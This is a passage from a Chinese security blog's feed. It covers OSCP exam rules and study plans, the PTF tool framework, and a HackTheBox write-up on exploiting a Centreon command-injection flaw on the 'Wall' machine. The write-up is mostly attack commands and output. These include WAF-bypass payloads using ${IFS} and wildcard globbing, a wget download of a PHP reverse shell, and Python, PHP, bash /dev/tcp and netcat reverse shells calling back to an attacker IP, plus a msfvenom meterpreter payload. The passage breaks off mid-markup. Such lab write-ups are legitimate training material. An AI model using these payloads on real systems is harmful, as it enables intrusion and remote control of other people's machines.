3台或者反过来。</p><p>关于难度，比hackthebox一些主机要简单，至少用户名和密码相同这种漏洞，在htb我还没遇到过，也许是送分题吧。htb考察的知识点也很典型，不会有特别偏和怪的/不常见的题。</p><p>关于复习，针对某些知识点需要彻底掌握，才能确保不丢分。例如hash破解、shellcode阅读和修改、windows和linux提权、常见服务可能出现的漏洞。</p><p>以上就是我对oscp真题的一些感受。</p>]]></content>
    
    
    <categories>
      
      <category>oscp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oscp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习清单：为oscp做准备</title>
    <link href="/2019/11/22/06-x/"/>
    <url>/2019/11/22/06-x/</url>
    
    <content type="html"><![CDATA[<p>Offensive Security Certified Professional</p><p>参考资料：</p><ul><li><a href="https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">官方考试要点</a></li><li><a href="https://blog.csdn.net/qq_34304107/article/details/87617133#_243">oscp faq</a></li><li><a href="https://www.lshack.cn/656/">非常全的oscp备考资料</a></li></ul><h2 id="考试规则"><a href="#考试规则" class="headerlink" title="考试规则"></a>考试规则</h2><p>时间：23小时45分钟考试，结束后24小时内编写并提交渗透测试报告。</p><p>随机抽取5个主机，每个主机有低权限flag和代表以获取最高权限的flag，分数不一。拿到70分代表考试合格。</p><h2 id="考试要准备的"><a href="#考试要准备的" class="headerlink" title="考试要准备的"></a>考试要准备的</h2><ul><li>护照</li><li>人民币5600——8050不等，根据购买lab时长而定。第一次没考过，可以续费lab，每次续费都附赠一次考试机会。也可以直接再次考试，费用150$一次。<br>有把握必过的人，建议购买30天的lab+考试;没把握的人，建议购买60天+的lab+考试。然后推荐提交课程报告（有5分加分）</li></ul><p><strong>考试地点</strong>：线上+摄像头监考</p><p><strong>提交报告要求</strong>：</p><ul><li>必须在截图中展示找到的flag文件内容和目标的ip；</li><li>在考试结束前提交local.txt和proof.txt两个flag到控制面板；</li><li>必须获得windows或者linux机器的最高权限才能获得满分。；</li></ul><p><strong>禁止的事项：</strong></p><ul><li>作弊（这个不用说了）</li><li>使用商业工具（msf pro、burp pro)</li><li>自动利用工具（sqlmap等自动sql注入、db_autopwn、browser_autopwn .etc）</li><li>大规模漏扫工具（nessus、openvas .etc）</li><li>可以使用的工具：nmap和nmap script、nikto、burp free、dirbuster .etc</li></ul><p><strong>限制事项：</strong></p><ul><li>只能在一台机器上使用metasploit，你可以选择用在哪一台机器上。对于非选定的机器，不能使用msf，哪怕是测试漏洞是否存在。</li></ul><p>如果你在选定的机器上，没有拿到权限，也不能在第二台机器上使用msf。</p><p>但是可以在所有机器上使用以下模块：</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">multi handler监听器<br>msfvenom<br>pattern<span class="hljs-emphasis">_create.rb</span><br><span class="hljs-emphasis">pattern_</span>offset.rb<br></code></pre></div></td></tr></table></figure><p><strong>考试通过条件</strong><br>满分100分，通过70分。<br>违反上述规则，将不得分。</p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>实际上都很重要，但是标重点是是要重点学习的，因为基本不会。。</p><ol><li>kali linux </li><li>必要的工具</li><li>被动信息搜集</li><li>主动信息搜集</li><li>漏洞扫描</li><li>缓冲区溢出（重点）</li><li>win32 缓冲区溢出利用（重点）</li><li>linux 缓冲区溢出利用（重点）</li><li>使用exp</li><li>文件传输（重点）</li><li>提权（重点）</li><li>客户端攻击</li><li>web应用攻击（重点）</li><li>密码攻击</li><li>端口转发和隧道（重点）</li><li>msf框架</li><li>绕过杀软（重点）</li><li>汇编渗透测试断点（重点）</li></ol><h2 id="时间分配"><a href="#时间分配" class="headerlink" title="时间分配"></a>时间分配</h2><p>明年6月中旬考试。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>google “VulnHub OSCP like machines”</li><li>hackthebox</li><li>根据考试大纲找资料熟练知识点，以便报名oscp后快速完成pdf上的练习，完成10台lab机器后获取5分加分。</li></ul>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ptf框架</title>
    <link href="/2019/11/21/11-x/"/>
    <url>/2019/11/21/11-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇： <a href="https://whale3070.github.io/tools/2019/08/31/10-x/">AWS亚马逊云服务器搭建与使用</a></p><ul><li><a href="https://github.com/trustedsec/ptf">https://github.com/trustedsec/ptf</a></li><li><a href="https://vimeo.com/137133837">https://vimeo.com/137133837</a></li><li><a href="https://www.freebuf.com/sectool/209091.html">https://www.freebuf.com/sectool/209091.html</a></li></ul><hr><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>君子性非异也,善假于物也</p><p>曾经有一句话一直困扰着我–“做渗透测试不要太依赖工具”。而渗透测试又不可能不用工具，我们使用各种各样的软件来扫描、用exp来利用、用一句话或者脚本反弹shell .etc</p><p>其实只要理解了漏洞的原理，不仅可以用工具，而且要提倡大力使用、广泛使用工具简化流程、甚至自己编写工具来提高速度。毕竟人和猴子的区别，就是人会用工具。</p><h2 id="ptf框架"><a href="#ptf框架" class="headerlink" title="ptf框架"></a>ptf框架</h2><p>上一篇已经讲了ptf框架的安装。</p><h3 id="为什么要用ptf框架"><a href="#为什么要用ptf框架" class="headerlink" title="为什么要用ptf框架?"></a>为什么要用ptf框架?</h3><p>ptf是渗透测试框架，为了解决渗透工具的更新而使用的。举个例子，老版本的masscan工具在扫描结束后，不会自动结束，而是一直等待，这样就不能在扫描完一个ip后继续扫描。而这个错误只要更新到最新版本就可以解决。</p><p>而更新软件是个复杂的差事，虽然用apt-get可以安装，但是软件名各种各样，甚至有的时候，你只知道需要什么功能的软件，但是你不知道软件的名字！这时候，使用ptf框架就十分方便</p><h3 id="如何用ptf框架"><a href="#如何用ptf框架" class="headerlink" title="如何用ptf框架?"></a>如何用ptf框架?</h3><ol><li><p>运行ptf<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-21-11/35.PNG" alt="35"></p></li><li><p>输入？查看使用方式</p></li></ol><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-21-11/36.PNG" alt="36"></p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> modules/ 加<span class="hljs-built_in">tab</span>按钮，自动补全命令<br>如果你不知道需要哪个软件，也可以使用上诉命令，<span class="hljs-built_in">tab</span>自动补全，会列出所有可以下载的软件，然后再挑选软件。<br><br>图中列出了很多模块，例如主动检测绕过、后渗透利用、代码审计、报告、逆向、漏洞分析等等。。<br></code></pre></div></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><br><span class="hljs-keyword">use</span> modules/exploitation/install_update_all<br>如果你想更新利用模块的所有软件，可以执行上述命令<br><br><span class="hljs-keyword">use</span> modules/install_update_all<br>不建议更新所有模块，因为等待时间长，占用磁盘空间，并且也不可能用上所有软件。<br><br>运用 <span class="hljs-keyword">cd</span> modules/xxx; <span class="hljs-keyword">update</span> 语法，即可更新某个模块的版本<br></code></pre></div></td></tr></table></figure><ol start="3"><li>所有已安装的tools都在/pentest目录</li></ol><p>先退出ptf模块，然后cd /pentest</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-21-11/37.PNG" alt="37"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wall-rce与绕过waf(下)</title>
    <link href="/2019/11/18/10-x/"/>
    <url>/2019/11/18/10-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://whale3070.github.io/waf/2019/11/11/12-x/">绕过waf之命令执行</a></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">题外话：恐惧和自满是练习的天敌。<br>——————《刻意练习》<br></code></pre></div></td></tr></table></figure><p>访问<code>http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1</code></p><p>手动测试命令执行</p><h2 id="失败的）测试绕过waf"><a href="#失败的）测试绕过waf" class="headerlink" title="(失败的）测试绕过waf"></a>(失败的）测试绕过waf</h2><p><code>/bin/w??t$&#123;IFS&#125;http://10.10.14.18/index.html</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/18.PNG" alt="18"><br>失败</p><hr><p><code>/usr/bin/w??t$&#123;IFS&#125;http://10.10.14.18:800/index.html%20%23</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/19.PNG" alt="19"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/20.PNG" alt="20"><br>成功</p><hr><p>/bin/nc.traditional -e 10.10.14.18 801</p><p><code>/bin/n?.???????????$&#123;IFS&#125;-e$&#123;IFS&#125;10.10.14.18$&#123;IFS&#125;801%20%23</code></p><p>结果<br>/bin/n?.??????????? not found</p><hr><p>/bin/ls /bin/bash</p><p>结果：<br>/bin/ls: cannot access &#039;/bin/bash%20%23&#039;: No such file or directory</p><hr><p>pwd</p><p>结果：<br>not found</p><hr><p>wget -v</p><p>/usr/bin/w??t${IFS}-v%20%23</p><p>结果：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>%<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>2<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>0<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>%<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>2<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>/usr/bin/wget: invalid option -- <span class="hljs-symbol">&amp;#039;</span>3<span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Usage: wget [OPTION]... [URL]...<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Try `wget --help<span class="hljs-symbol">&amp;#039;</span> for more<br></code></pre></div></td></tr></table></figure><hr><p>本地开启802端口，准备好w.php——php反弹shell脚本。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span>:<span class="hljs-number">802</span><span class="hljs-regexp">/w.php -P /</span>tmp<br><br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/w??t$&#123;IFS&#125;http:/</span><span class="hljs-regexp">/10.10.14.18:802/</span>w.php<span class="hljs-variable">$&#123;IFS&#125;</span>/tmp%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/21.PNG" alt="21"><br>成功</p><hr><p>本地准备nc监听9000端口，等待反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">chmod +x <span class="hljs-regexp">/tmp/</span>w.php;.<span class="hljs-regexp">/tmp/</span>w.php<br><br>chmod<span class="hljs-variable">$&#123;IFS&#125;</span>+x<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-regexp">/tmp/</span>w.php;.<span class="hljs-regexp">/tmp/</span>w.php%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br><br>结果：.<span class="hljs-regexp">/tmp/</span>w.php%<span class="hljs-number">20</span>%<span class="hljs-number">23</span> not found<br>问题是，不知道wget把w.php保存到哪里去了。用<span class="hljs-regexp">/bin/</span>ls也没有找到。<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span>$&#123;IFS&#125;+<span class="hljs-keyword">x</span>$&#123;IFS&#125;/tmp/w.php;php$&#123;IFS&#125;/tmp/w.php%2<span class="hljs-number">0</span>%23<br><br>Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">open</span> input file: <span class="hljs-regexp">/tmp/</span>w.php%2<span class="hljs-number">0</span>%23<br></code></pre></div></td></tr></table></figure><hr><p>ls被waf拦截，使用echo</p><p><code>echo$&#123;IFS&#125;/tmp/w.php%20%23</code>  成功</p><hr><p>python –version</p><p>python${IFS}–version${IFS}%20%23</p><p>Python 2.7.15+</p><hr><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><p>python${IFS}-c${IFS}’import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.18”,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’%20%23</p><p>403 forbidden</p><hr><p>php –version</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">PHP 7.3.6-1+ubuntu18.04.1+deb.sury.org+1 (<span class="hljs-keyword">cli</span>) (built: May 31 2019 11:06:48) ( NTS )&lt;<span class="hljs-keyword">br</span>&gt;<span class="hljs-keyword">Copyright</span> (c) 1997-2018 The PHP Group&lt;<span class="hljs-keyword">br</span>&gt;Zend Engine v3.3.6, <span class="hljs-keyword">Copyright</span> (c) 1998-2018 Zend Technologies&lt;<span class="hljs-keyword">br</span>&gt;    with Zend OPcache v7.3.6-1+ubuntu18.04.1+deb.sury.org+1, <span class="hljs-keyword">Copyright</span> (c) 1999-2018, <span class="hljs-keyword">by</span> Zend Technologies&lt;<span class="hljs-keyword">br</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;&lt;/div&gt;&lt;<span class="hljs-keyword">br</span>/&gt;]<br><br>php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;10.10.14.18&quot;</span>,9000);exec(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br>。。。<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">/bin/n?$&#123;IFS&#125;-h%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br><br>OpenBSD netcat (Debian patchlevel <span class="hljs-number">1.187</span>-<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">1</span>)<span class="hljs-symbol">&lt;br&gt;</span>usage: nc [-<span class="hljs-number">46</span>CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]<span class="hljs-symbol">&lt;br&gt;</span>  [-<span class="hljs-keyword">m</span> minttl] [-O length] [-<span class="hljs-keyword">P</span> proxy_username] [-<span class="hljs-keyword">p</span> source_port]<span class="hljs-symbol">&lt;br&gt;</span>  [-q seconds] [-s <span class="hljs-keyword">source</span>] [-T keyword] [-V rtable] [-W recvlimit] [-<span class="hljs-keyword">w</span> timeout]<span class="hljs-symbol">&lt;br&gt;</span>  [-<span class="hljs-keyword">X</span> proxy_protocol] [-<span class="hljs-keyword">x</span> proxy_address[:port]]   [destination] [port]<span class="hljs-symbol">&lt;br&gt;</span>Command Summary:<span class="hljs-symbol">&lt;br&gt;</span>-<span class="hljs-number">4</span>Use IPv4<span class="hljs-symbol">&lt;br&gt;</span>-<span class="hljs-number">6</span>Use IPv6<span class="hljs-symbol">&lt;br&gt;</span>-bAllow broadcast<span class="hljs-symbol">&lt;br&gt;</span>-CSend CRLF <span class="hljs-keyword">as</span> <span class="hljs-built_in">line</span>-ending<span class="hljs-symbol">&lt;br&gt;</span>-DEnable the <span class="hljs-keyword">debug</span> socket option<span class="hljs-symbol">&lt;br&gt;</span>-dDetach from stdin<span class="hljs-symbol">&lt;br&gt;</span>-FPass socket fd<span class="hljs-symbol">&lt;br&gt;</span>-hThis <span class="hljs-keyword">help</span> text<span class="hljs-symbol">&lt;br&gt;</span>-I lengthTCP receive <span class="hljs-keyword">buffer</span> length<span class="hljs-symbol">&lt;br&gt;</span>-i intervalDelay interval <span class="hljs-keyword">for</span> lines sent, ports scanned<span class="hljs-symbol">&lt;br&gt;</span>-kKeep inbound sockets <span class="hljs-keyword">open</span> <span class="hljs-keyword">for</span> multiple connects<span class="hljs-symbol">&lt;br&gt;</span>-lListen <span class="hljs-keyword">mode</span>, <span class="hljs-keyword">for</span> inbound connects<span class="hljs-symbol">&lt;br&gt;</span>-M ttlOutgoing TTL / Hop Limit<span class="hljs-symbol">&lt;br&gt;</span>-<span class="hljs-keyword">m</span> minttlMinimum incoming TTL / Hop Limit<span class="hljs-symbol">&lt;br&gt;</span>-NShutdown the network socket after EOF <span class="hljs-keyword">on</span> stdin<span class="hljs-symbol">&lt;br&gt;</span>-nSuppress name/port resolutions<span class="hljs-symbol">&lt;br&gt;</span>-O lengthTCP send <span class="hljs-keyword">buffer</span> length<span class="hljs-symbol">&lt;br&gt;</span>-<span class="hljs-keyword">P</span> proxyuserUsername <span class="hljs-keyword">for</span> proxy authe<br><br>openbsd版本的nc，没有-<span class="hljs-keyword">e</span>参数的那种<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br><br><span class="hljs-regexp">/bin/</span>rm<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-regexp">/tmp/</span>f;<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/mkfifo$&#123;IFS&#125;/</span>tmp<span class="hljs-regexp">/f;/</span>bin<span class="hljs-regexp">/cat$&#123;IFS&#125;/</span>tmp<span class="hljs-regexp">/f|/</span>bin<span class="hljs-regexp">/sh$&#123;IFS&#125;-i$&#123;IFS&#125;2&gt;&amp;1|/</span>bin<span class="hljs-regexp">/n?$&#123;IFS&#125;10.10.14.18$&#123;IFS&#125;443$&#123;IFS&#125;&gt;/</span>tmp/f%<span class="hljs-number">20</span>%<span class="hljs-number">23</span><br></code></pre></div></td></tr></table></figure><hr><h2 id="exp测试"><a href="#exp测试" class="headerlink" title="exp测试"></a>exp测试</h2><p>11月17日更新，周末终于有空了。<br>为了简化手动操作的繁琐，我修改了一下exp。这是下载地址：<a href="https://github.com/Whale3070/ctf-coding/blob/master/centreon.py">https://github.com/Whale3070/ctf-coding/blob/master/centreon.py</a>，使用方式是<code>./centreon.py 要执行的命令</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/70.PNG" alt="70"></p><p>成功查看了wget的版本，1.19.4</p><hr><p><code>./centreon.py &quot;uname$&#123;IFS&#125;-a&quot;</code></p><hr><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-number">123</span><br><span class="hljs-attribute">123</span><br><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">echo <span class="hljs-regexp">/b?n/</span>?s<br><span class="hljs-regexp">/bin/</span>ls <span class="hljs-regexp">/bin/</span>ps <span class="hljs-regexp">/bin/</span>ss<br><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">echo <span class="hljs-regexp">/b?n/</span>?c<br><span class="hljs-regexp">/bin/</span>nc<br><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"> <span class="hljs-regexp">/b?n/</span>?c -h<br><br>OpenBSD netcat (Debian patchlevel <span class="hljs-number">1.187</span>-<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">1</span>)<br><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>| <span class="hljs-regexp">/b?n/</span>?c <span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span> <span class="hljs-number">443</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br>失败<br><br><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.14.18/</span><span class="hljs-number">443</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br></code></pre></div></td></tr></table></figure><hr><p>/bin/?s /</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/1.PNG" alt="1"></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">boot</span><br><span class="hljs-keyword"></span>dev<br>etc<br>home<br>...<br></code></pre></div></td></tr></table></figure><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">ls -al<br>-rw------- <span class="hljs-number">1</span> shelby   shelby       <span class="hljs-number">33</span> Jul  <span class="hljs-number">4</span> <span class="hljs-number">01</span>:<span class="hljs-number">22</span> <span class="hljs-regexp">/home/</span>shelby/user.txt<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data   <span class="hljs-number">4089</span> Nov <span class="hljs-number">18</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/centreon/</span>filesGeneration<span class="hljs-regexp">/engine/</span><span class="hljs-number">1</span>/centengine.DEBUG<br><br></code></pre></div></td></tr></table></figure><hr><p>wget <a href="http://10.10.14.18/w.php">http://10.10.14.18/w.php</a> -P /tmp<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/2.PNG" alt="2"></p><hr><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">/bin/?s /tmp<span class="hljs-string">&quot;</span><br>w.php<br><br></code></pre></div></td></tr></table></figure><hr><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">chm\od +x <span class="hljs-regexp">/tmp/</span>w.php<br><br>mode of &amp;#<span class="hljs-number">039</span>;<span class="hljs-regexp">/tmp/</span>w.php&amp;#<span class="hljs-number">039</span>; changed <span class="hljs-keyword">from</span> <span class="hljs-number">0644</span> (rw-r--r--) to <span class="hljs-number">0755</span> (rwxr-xr-x)<br><br></code></pre></div></td></tr></table></figure><hr><p>./centreon.py ip port “php /tmp/w.php”<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/3.PNG" alt="3"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">kali生成恶意载荷<br>msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.14.18 <span class="hljs-attribute">LPORT</span>=445 -f elf -o w.elf<br></code></pre></div></td></tr></table></figure><p>shell执行下载：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span><span class="hljs-regexp">/w.elf -P /</span>tmp<br> chmod +x w.elf<br><br></code></pre></div></td></tr></table></figure><p>kali执行监听：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfconsole<br>handler -H <span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span> -P <span class="hljs-number">445</span> -p linux<span class="hljs-regexp">/x86/m</span>eterpreter/reverse_tcp<br><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span><span class="hljs-regexp">/w.elf -P /</span>tmp<br><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-18-10/4.PNG" alt="4"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span 